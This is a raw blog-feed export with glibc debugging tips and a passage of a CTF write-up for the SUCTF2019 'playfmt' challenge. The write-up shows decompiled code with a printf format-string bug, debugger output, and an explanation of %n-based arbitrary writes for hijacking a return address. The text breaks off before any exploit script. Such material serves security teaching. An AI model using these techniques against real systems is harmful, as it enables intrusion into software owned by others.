        <content type="html"><![CDATA[<h1 id="搜索libc"><a href="#搜索libc" class="headerlink" title="搜索libc"></a>搜索libc</h1><p> <a href="https://libc.nullbyte.cat/" target="_blank" rel="noopener">https://libc.nullbyte.cat/</a> </p><h1 id="恢复linux下静态编译程序的符号表"><a href="#恢复linux下静态编译程序的符号表" class="headerlink" title="恢复linux下静态编译程序的符号表"></a>恢复linux下静态编译程序的符号表</h1><p>先去<a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">https://github.com/push0ebp/sig-database</a>把sig文件都下载下来，然后用ida打开程序之后</p><p>选择<code>FILE--&gt;LOAD_FILE--&gt;FLIRT</code>,选择对应版本的<code>libc</code>即可</p><p>但是要把相对应的<code>.sig</code>放在<code>($IDA)/sig/pc/</code>目录下</p><h1 id="源码调试glibc"><a href="#源码调试glibc" class="headerlink" title="源码调试glibc"></a>源码调试glibc</h1><p>三部曲</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install glibc-source</span><br><span class="line">sudo apt install libc6-dbg</span><br><span class="line">sudo tar -xf /usr/src/glibc/glibc-2.23.tar.xz</span><br></pre></td></tr></table></figure><p>搞好后</p><p>程序运行时贴上去<br><code>/usr/src/glibc/glibc-2.23/</code>时源码目录，然后后面的文件夹要自己指定下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; directory /usr/src/glibc/glibc-2.23/stdlib/</span><br></pre></td></tr></table></figure><p>然后就可以快乐<code>debug</code>了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x7f7c75a3f030</span> &lt;<span class="built_in">exit</span>&gt;          lea    rsi, [rip + <span class="number">0x38a5c1</span>] &lt;<span class="number">0x7f7c75dc95f8</span>&gt;</span><br><span class="line">   <span class="number">0x7f7c75a3f037</span> &lt;<span class="built_in">exit</span>+<span class="number">7</span>&gt;        sub    rsp, <span class="number">8</span></span><br><span class="line"> ► <span class="number">0x7f7c75a3f03b</span> &lt;<span class="built_in">exit</span>+<span class="number">11</span>&gt;       mov    edx, <span class="number">1</span></span><br><span class="line">   <span class="number">0x7f7c75a3f040</span> &lt;<span class="built_in">exit</span>+<span class="number">16</span>&gt;       call   __run_exit_handlers &lt;<span class="number">0x7f7c75a3ef10</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f7c75a3f045</span>                 nop    word ptr cs:[rax + rax]</span><br><span class="line">   <span class="number">0x7f7c75a3f04f</span>                 nop    </span><br><span class="line">   <span class="number">0x7f7c75a3f050</span> &lt;on_exit&gt;       push   rbp</span><br><span class="line">   <span class="number">0x7f7c75a3f051</span> &lt;on_exit+<span class="number">1</span>&gt;     push   rbx</span><br><span class="line">   <span class="number">0x7f7c75a3f052</span> &lt;on_exit+<span class="number">2</span>&gt;     mov    rbx, rdi</span><br><span class="line">   <span class="number">0x7f7c75a3f055</span> &lt;on_exit+<span class="number">5</span>&gt;     lea    rdi, [rip + <span class="number">0x38a59c</span>] &lt;<span class="number">0x7f7c75dc95f8</span>&gt;</span><br><span class="line">   <span class="number">0x7f7c75a3f05c</span> &lt;on_exit+<span class="number">12</span>&gt;    mov    rbp, rsi</span><br><span class="line">──────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────</span><br><span class="line">In file: /usr/src/glibc/glibc<span class="number">-2.23</span>/stdlib/<span class="built_in">exit</span>.c</span><br><span class="line">    <span class="number">99</span> </span><br><span class="line">   <span class="number">100</span> </span><br><span class="line">   <span class="number">101</span> <span class="keyword">void</span></span><br><span class="line">   <span class="number">102</span> <span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">   <span class="number">103</span> &#123;</span><br><span class="line"> ► <span class="number">104</span>   __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">   <span class="number">105</span> &#125;</span><br><span class="line">   <span class="number">106</span> libc_hidden_def (<span class="built_in">exit</span>)</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffb8837a40</span> —▸ <span class="number">0x4008f0</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffb8837a48</span> —▸ <span class="number">0x7f7c75a25837</span> (__libc_start_main+<span class="number">247</span>) ◂— xor    edx, edx</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffb8837a50</span> ◂— <span class="number">0x1</span></span><br><span class="line">03:0018│      0x7fffb8837a58 —▸ 0x7fffb8837b28 —▸ 0x7fffb88391e5 ◂— './easy_printf'</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffb8837a60</span> ◂— <span class="number">0x175ff4ca0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffb8837a68</span> —▸ <span class="number">0x4008c4</span> (main) ◂— push   rbp</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffb8837a70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffb8837a78</span> ◂— <span class="number">0xf14646c49173d8d5</span></span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>7c75a3f03b <span class="built_in">exit</span>+<span class="number">11</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>7c75a25837 __libc_start_main+<span class="number">247</span></span><br></pre></td></tr></table></figure><p>舒服死了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-playfmt-printf的成链攻击</title>
      <link href="/2019/11/12/SUCTF2019-playfmt-printf%E2%95%A1%E2%94%80%E2%94%82%E2%95%94%E2%94%B4%E2%94%A4%E2%95%A3%C3%91%E2%95%97%E2%89%88/"/>
      <url>/2019/11/12/SUCTF2019-playfmt-printf%E2%95%A1%E2%94%80%E2%94%82%E2%95%94%E2%94%B4%E2%94%A4%E2%95%A3%C3%91%E2%95%97%E2%89%88/</url>
      
        <content type="html"><![CDATA[<p>首先检查一下程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ checksec playfmt</span><br><span class="line">[*] '/mnt/hgfs/share/tmp/playfmt/playfmt'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabledx</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>可以知道我们无法修改got表，栈上的代码不可执行，尝试执行一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmt</span><br><span class="line">open flag error , please contact the administrator!</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmt</span><br><span class="line">Testing my C++ skills...</span><br><span class="line">testing <span class="number">1.</span>..</span><br><span class="line">hello,world</span><br><span class="line">testing <span class="number">2.</span>..</span><br><span class="line">hello,world</span><br><span class="line">testing <span class="number">3.</span>..</span><br><span class="line">You think I will leave the flag?</span><br><span class="line">hello,world</span><br><span class="line">=====================</span><br><span class="line">  Magic echo Server</span><br><span class="line">=====================</span><br></pre></td></tr></table></figure><p>用IDA Pro查看一下源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  derived *v3; <span class="comment">// ebx</span></span><br><span class="line">  derived *v4; <span class="comment">// ebx</span></span><br><span class="line">  derived *v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// [esp+0h] [ebp-24h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  v8 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"open flag error , please contact the administrator!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fscanf</span>(stream, <span class="string">"%s"</span>, v8);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Testing my C++ skills..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 1..."</span>);</span><br><span class="line">  v3 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    derived::~derived(v3);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v3)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 2..."</span>);</span><br><span class="line">  v4 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    derived::~derived(v4);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v4)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 3..."</span>);</span><br><span class="line">  v5 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v5, v8);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You think I will leave the flag?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    base::~base(v5);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v5)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = Get_return_addr();</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="keyword">if</span> ( Get_return_addr() != v6 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到关键功能函数<strong>logo</strong></p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">logo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v0 = Get_return_addr();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"====================="</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  Magic echo Server"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"====================="</span>);</span><br><span class="line">  do_fmt();</span><br><span class="line">  result = Get_return_addr() != v0;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到漏洞点<strong>do_fmt</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fmt</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">"quit"</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 程序漏洞点比较明显，直接写了一个循环的<code>printf</code>格式化漏洞，而输入的数据是存储在<code>buf</code>指针上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ readelf -S playfmt</span><br><span class="line">There are 30 section headers, starting at offset 0x2c44:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 0000b4 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          08048260 000260 000190 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          080483f0 0003f0 000159 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804854a 00054a 000032 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804857c 00057c 000060 00   A  6   2  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080485dc 0005dc 000098 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048674 000674 000008 08  AI  5  23  4</span><br><span class="line">  [11] .init             PROGBITS        0804867c 00067c 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080486a0 0006a0 000020 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080486c0 0006c0 000090 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048750 000750 000532 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048c84 000c84 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048c98 000c98 0000e9 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048d84 000d84 00007c 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048e00 000e00 000218 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      0804ae98 001e98 000008 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      0804aea0 001ea0 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        0804aea4 001ea4 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         0804aea8 001ea8 000100 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        0804afa8 001fa8 000058 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804b000 002000 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804b020 002008 0000ec 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 002008 000035 01  MS  0   0  1</span><br><span class="line">  [27] .shstrtab         STRTAB          00000000 002b40 000101 00      0   0  1</span><br><span class="line">  [28] .symtab           SYMTAB          00000000 002040 000660 10     29  49  4</span><br><span class="line">  [29] .strtab           STRTAB          00000000 0026a0 0004a0 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure><p><code>buf</code>则是位于<strong>bss</strong>段中地址为<strong>0x0804B040</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804B</span>040                 <span class="keyword">public</span> buf</span><br><span class="line">.bss:<span class="number">0804B</span>040 ; <span class="keyword">char</span> buf[<span class="number">200</span>]</span><br><span class="line">.bss:<span class="number">0804B</span>040 buf             db <span class="number">0</span><span class="function">C8h <span class="title">dup</span><span class="params">(?)</span>    </span>; DATA XREF: do_fmt(<span class="keyword">void</span>)+E↑o</span><br></pre></td></tr></table></figure><p> 所以思路就是直接修改栈上的返回地址，<code>return</code>的时候劫持流程</p><p>我们首先复习一下格式化字符</p><p>格式化字符串漏洞的具体原理就不再详细叙述，这里主要简单介绍一下格式化参数位置的计算和漏洞利用时常用的格式字符。</p><ul><li>参数位置计算</li></ul><p>linux下32位程序是栈传参，从左到右参数顺序为<code>$esp+4,$esp+8,...</code>；因此<code>$esp+x</code>的位置应该是格式化第<code>x/4</code>个参数。</p><p>linux下64位程序是寄存器加栈传参，从左到右参数顺序为<code>$rdi,$rsi,$rdx,$rcx,$r8,$r9,$rsp+8,...</code>；因此<code>$rsp+x</code>的位置应该是格式化第<code>x/8+6</code>个参数。</p><ul><li>常用的格式化字符</li></ul><p>用于地址泄露的格式化字符有：<code>%x、%s、%p</code>等；</p><p>用于地址写的格式化字符：<code>%hhn</code>（写入一字节），<code>%hn</code>（写入两字节），<code>%n</code>（32位写四字节，64位写8字节）；</p><p><code>%&lt; number&gt;$type</code>：直接作用第number个位置的参数，如：<code>%7$x</code>读第7个位置参数值，<code>%7$n</code>对第7个参数位置进行写。</p><p><code>%c</code>：输出<strong>number</strong>个字符，配合<code>%n</code>进行任意地址写，例如<code>&quot;%{}c%{}$hhn&quot;.format(address,offset)</code>就是向<code>offset0</code>参数指向的地址最低位写成<code>address</code></p><p>一般来说，栈上的格式化字符串漏洞利用步骤是先泄露地址，包括<strong>ELF</strong>程序地址和<strong>libc</strong>地址；然后将需要改写的<strong>GOT</strong>表地址直接传到栈上，同时利用<code>%c%n</code>的方法改写入<code>system或one_gadget</code>地址，最后就是劫持流程。但是对于<strong>BSS</strong>段或是堆上格式化字符串，无法直接将想要改写的地址指针放置在栈上，也就没办法实现任意地址写。 </p><p>那我们就先下一个断点在printf执行之前，看看栈上有什么可以利用的东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffd030</span> —▸ <span class="number">0x804b040</span> (buf) ◂— <span class="number">0xa</span> <span class="comment">/* '\n' */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffffd034</span> —▸ <span class="number">0x8048cac</span> ◂— jno    <span class="number">0x8048d23</span> <span class="comment">/* 'quit' */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│      <span class="number">0xffffd038</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffffd03c</span> —▸ <span class="number">0x80488e8</span> (logo()+<span class="number">59</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffd040</span> —▸ <span class="number">0x8048cb1</span> ◂— cmp    eax, <span class="number">0x3d3d3d3d</span> <span class="comment">/* '=====================' */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│      <span class="number">0xffffd044</span> —▸ <span class="number">0x8048ac4</span> (main+<span class="number">440</span>) —▸ <span class="number">0xfffd82e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│ ebp  <span class="number">0xffffd048</span> —▸ <span class="number">0xffffd068</span> —▸ <span class="number">0xffffd098</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│      <span class="number">0xffffd04c</span> —▸ <span class="number">0x80488f0</span> (logo()+<span class="number">67</span>) —▸ <span class="number">0xffff56e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│      <span class="number">0xffffd050</span> —▸ <span class="number">0xf7e30000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1d7d6c</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> <span class="number">0x8048000</span>  <span class="number">0x804a000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /mnt/hgfs/share/tmp/playfmt/playfmt</span><br><span class="line"> <span class="number">0x804a000</span>  <span class="number">0x804b000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /mnt/hgfs/share/tmp/playfmt/playfmt</span><br><span class="line"> <span class="number">0x804b000</span>  <span class="number">0x804c000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /mnt/hgfs/share/tmp/playfmt/playfmt</span><br><span class="line"> <span class="number">0x804c000</span>  <span class="number">0x806e000</span> rw-p    <span class="number">22000</span> <span class="number">0</span>      [heap]</span><br><span class="line"><span class="number">0xf7b36000</span> <span class="number">0xf7b38000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7b38000</span> <span class="number">0xf7b54000</span> r-xp    <span class="number">1</span>c000 <span class="number">0</span>      /lib/i386-linux-gnu/libgcc_s.so<span class="number">.1</span></span><br><span class="line"><span class="number">0xf7b54000</span> <span class="number">0xf7b55000</span> r--p     <span class="number">1000</span> <span class="number">1b</span>000  /lib/i386-linux-gnu/libgcc_s.so<span class="number">.1</span></span><br><span class="line"><span class="number">0xf7b55000</span> <span class="number">0xf7b56000</span> rw-p     <span class="number">1000</span> <span class="number">1</span>c000  /lib/i386-linux-gnu/libgcc_s.so<span class="number">.1</span></span><br><span class="line"><span class="number">0xf7b56000</span> <span class="number">0xf7c56000</span> r-xp   <span class="number">100000</span> <span class="number">0</span>      /lib/i386-linux-gnu/libm<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7c56000</span> <span class="number">0xf7c57000</span> r--p     <span class="number">1000</span> ff000  /lib/i386-linux-gnu/libm<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7c57000</span> <span class="number">0xf7c58000</span> rw-p     <span class="number">1000</span> <span class="number">100000</span> /lib/i386-linux-gnu/libm<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7c58000</span> <span class="number">0xf7e2d000</span> r-xp   <span class="number">1</span>d5000 <span class="number">0</span>      /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e2d000</span> <span class="number">0xf7e2e000</span> ---p     <span class="number">1000</span> <span class="number">1</span>d5000 /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e2e000</span> <span class="number">0xf7e30000</span> r--p     <span class="number">2000</span> <span class="number">1</span>d5000 /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e30000</span> <span class="number">0xf7e31000</span> rw-p     <span class="number">1000</span> <span class="number">1</span>d7000 /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span 